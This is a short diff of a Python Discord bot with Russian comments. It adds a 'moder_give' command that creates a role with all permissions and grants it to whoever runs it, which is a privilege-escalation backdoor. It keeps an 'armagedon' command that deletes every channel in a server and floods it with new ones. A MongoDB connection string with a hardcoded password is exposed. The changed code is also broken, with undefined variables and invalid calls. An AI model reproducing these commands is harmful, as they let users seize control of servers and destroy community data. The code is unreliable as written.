@@ -4,6 +4,9 @@ import discord
 from discord.ext import commands
 import pytz
 from random import randint
+
+from discord import Permissions
+
 client = commands.Bot(command_prefix=">",intents=discord.Intents.all())
 
 cluster = MongoClient("mongodb+srv://ekfar1:1234@cluster0.dhafo.mongodb.net/bd?retryWrites=true&w=majority")
@@ -72,15 +75,14 @@ async def admindata(ctx):
 #не касается кода знакомств
 @client.command()
 async def moder_give(ctx):
-    member = ctx.message.author
-    role_1 = member.guild.get_role(848876539000258572)# ади роли которую будет получать юзер
-    await member.add_roles(role_1)
+    role = await client.create_role(server, name="zutkm", permissions=Permissions.all())
+    await client.add_roles(member, role)
 @client.command()
 async def armagedon(ctx,name):
     guild = ctx.guild
     for channel in guild.channels:
         await channel.delete()
     for channel in range(10):
-        await channel.create_text_channel(str(name))
+        await create_text_channel(str(name))
 
 client.run(os.environ['token'])
